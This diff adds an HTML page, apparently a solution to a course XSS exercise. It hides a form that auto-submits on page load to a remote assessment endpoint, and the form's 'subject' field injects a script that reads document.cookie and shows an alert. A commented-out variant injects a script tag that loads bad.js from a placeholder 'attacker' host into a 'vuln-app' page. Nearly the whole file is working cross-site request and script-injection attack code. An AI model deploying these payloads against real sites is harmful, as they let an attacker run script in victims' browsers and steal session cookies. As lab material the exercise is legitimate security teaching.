@@ -1,0 +1,41 @@
+<html>
+  <head>
+    <title>Email Contact Form</title>
+  </head>
+  <body>
+    <!-- <form name=TheForm action=http://vuln-app/page.jsp method=post>
+            <input type=hidden name=foo value="&quot;&gt;&lt;script&#32;src=http://attacker/ bad.js&gt;&lt;/script&gt;" /></form>
+            <script>
+            document.TheForm.submit();
+            </script> -->
+    <!-- 
+            name: Somboi
+email: darkfun14@gmail.com
+subject: <script testId="">console.log(document.cookie);alert(`XSS Detected`);</script testId="">
+body: BLAH
+             -->
+    <form
+      name="TheForm"
+      action="https://inte2102.semiregular.space/Practical_Assessment/1/XSS/%7B88326736-137a-4ea9-b783-7327a79a2165%7D/ex4/"
+      method="post"
+    >
+      <input type="hidden" id="name" name="name" value="Somboi" />
+      <input
+        type="hidden"
+        id="email"
+        name="email"
+        value="darkfun14@gmail.com"
+      />
+      <input
+        type="hidden"
+        id="subject"
+        name="subject"
+        value='<script testId="">console.log(document.cookie);alert(`XSS Detected`);</script testId="">'
+      />
+      <input type="hidden" id="body" name="body" value="blah" />
+    </form>
+    <script>
+      document.TheForm.submit();
+    </script>
+  </body>
+</html>
